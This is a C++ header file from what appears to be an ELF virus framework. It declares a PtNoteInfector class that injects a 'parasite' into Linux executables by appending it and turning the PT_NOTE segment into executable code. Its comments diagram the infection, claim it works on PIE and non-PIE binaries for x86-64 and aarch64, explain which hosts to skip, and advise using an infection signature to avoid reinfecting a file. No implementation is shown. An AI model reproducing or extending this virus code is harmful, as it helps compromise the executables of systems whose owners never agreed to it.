#pragma once
#include <elf.h>
#include <optional>
#include <span>
#include "infector/injection_result.hh"

namespace vf::infector {
// This algorithm injects a parasite to the end of the elf structure and mutate
// the pt_note segment to be executable, pointing to our parasite.
//
//  host elf structure                           infected elf structure
//  -------------------                          -----------------------
//  elf_hdr            <------|    |----->       elf_hdr
//  phdrs                 CODE|    |CODE         phdrs
//  non-exec sections         |    |             non-exec sections
//  exec sections             |    |             exec sections
//  non-exec sections  <------|    |----->       non-exec sections
//                        RO  |    | RO
//  shdrs              <------|    |----->       shdrs
//                                 |CODE->       *virus <-------
//
// Contrary to almost all sources I can find online about this algorithm, this
// implementation actually works on both PIE and non-PIE binaries after some
// tweaking (both aarch64 and x86-64).
//
// Because elfs compiled from golang uses PT_NOTE for special purposes:
//
// $readelf -n /usr/bin/docker
// Displaying notes found in: .note.go.buildid
// Owner                Data size 	Description
// Go                   0x00000053	Unknown note type: (0x00000004)
//  description data: 6a 4b 45 46 72 64 4c 4c 6
//
// We hence do not infect golang elfs. In addition, for binaries that have data
// appended to the end of the file, we also give up because the application code
// might reverse seek from the end of the file and look for data there (like
// bazel). We also skip these even though we could just insert right before the
// section header and shift everything back. The complexity is not worth it for
// these binaries without being certain that this actually works (maybe it
// will). Other than that, this method pretty much allows viruses of any size to
// be inserted and has the highest success rate compared to text padding and
// reverse text algorithms.
//
// Note that it's possible to infect victims multiple times if they have more
// than one PT_NOTE segment (for example on x86). It's recommended to use an
// infection signature to avoid recursive infection.

class PtNoteInfector {
 public:
  // Return the size of the binary after a successful infection. This algorithm
  // will increase the file size.
  size_t injected_host_size() const;

  // Scan the elf to see if it can be injected with a parasite into a its PT
  // NOTE section.
  // @param host_mapping The host elf mapping.
  // @param parasite_size The size of the parasite.
  // @return True if the host binary can be injected.
  bool analyze(std::span<const std::byte> host_mapping,
               std::span<const std::byte> parasite_mapping);

  // Perform the injection,
  // @param host_mapping The host binary to be injected.
  // @param parasite_mapping The virus.
  // @return the injection result. std::nullopt if injection failed.
  // Callers are responsible for memory allocation. This class is no-owning.
  std::optional<InjectionResult> inject(
      std::span<std::byte> host_mapping,
      std::span<const std::byte> parasite_mapping);

 private:
  size_t host_size_{};
  size_t parasite_size_{};
  Elf64_Addr original_e_entry_{};
  Elf64_Off original_pt_note_file_offset_{};
  Elf64_Off virus_offset_{};
  Elf64_Addr parasite_load_address_{};
  Elf64_Xword pt_load_alignment_{};
  size_t pt_note_to_be_infected_idx_{};
};

}  // namespace vf::infector